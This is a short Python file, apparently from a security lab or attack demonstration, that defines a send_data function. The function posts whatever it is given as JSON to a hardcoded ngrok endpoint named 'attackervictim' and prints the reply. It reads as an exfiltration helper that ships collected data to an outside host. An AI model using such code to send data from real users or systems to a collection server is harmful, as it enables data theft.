import requests

headers = {"Content-Type": "application/json"}



url='https://attackervictim.ngrok.app/data'


def send_data(info):

    data = {"data": info}
    print('informacio')
    print(info)
    response = requests.post(url, headers=headers, json=data)
    response.raise_for_status()

    print('---------------------------------------------------------')
    print('---------------------------------------------------------')
    print('---------------------------------------------------------')
    print(response.json())
    print('---------------------------------------------------------')
    print('---------------------------------------------------------')
    print('---------------------------------------------------------')


